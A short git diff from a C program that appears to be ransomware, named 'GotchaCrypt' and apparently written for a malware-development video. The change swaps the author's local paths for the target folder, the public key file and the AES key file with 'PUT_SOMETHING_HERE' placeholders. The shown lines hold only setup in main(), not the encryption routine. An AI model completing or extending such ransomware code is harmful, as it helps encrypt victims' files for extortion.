@@ -262,9 +262,9 @@ void encryptAES(const char* key, unsigned long* keyLen, const char* AESDONTDELEA
 
 
 int main() {
-    const char* path = "C:/Users/mjank/Desktop/DANGER";
-    const char* SPubKey = "C:/Users/mjank/Documents/MalDev/RansomwareVideo/GotchaCrypt/keys/public.txt";
-    const char* AESDONTDELEATE = "C:/Users/mjank/Desktop/AESDONTDELEATE.txt";
+    const char* path = "PUT_SOMETHING_HERE";
+    const char* SPubKey = "PUT_SOMETHING_HERE";
+    const char* AESDONTDELEATE = "PUT_SOMETHING_HERE";
     const char* key = generateKey();
     unsigned int keySize = 256;
 
